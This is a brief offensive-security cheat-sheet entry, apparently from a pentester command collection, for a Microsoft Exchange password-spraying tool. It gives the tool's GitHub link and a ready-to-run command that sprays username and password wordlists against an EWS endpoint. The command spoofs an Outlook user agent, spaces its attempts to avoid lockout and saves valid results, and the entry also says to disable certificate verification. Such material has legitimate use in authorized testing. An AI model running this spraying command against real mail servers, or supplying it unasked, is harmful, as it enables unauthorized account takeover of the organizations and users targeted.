# exchange_password_spray
% exchange
#plateform/linux  #target/remote  #protocol/exchange #cat/ATTACK/BRUTEFORCE-SPRAY 


## _url
```
https://github.com/iomoath/PyExchangePasswordSpray/tree/master
```

## _desc
```
Microsoft Exchange password spraying tool with proxy capabilities
```

## _links
```
https://github.com/iomoath/PyExchangePasswordSpray/tree/master
```

## bruteforce (EWS)
user format <domain_netbios>\<user>
edit script to set verify=False
```bash
python3 exchange_password_spray.py  -U <user_wl> -P <password_wl>  --url https://<fqdn>/ews --delay 62 -T 1 -ua "Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)" -O result.txt -v
```
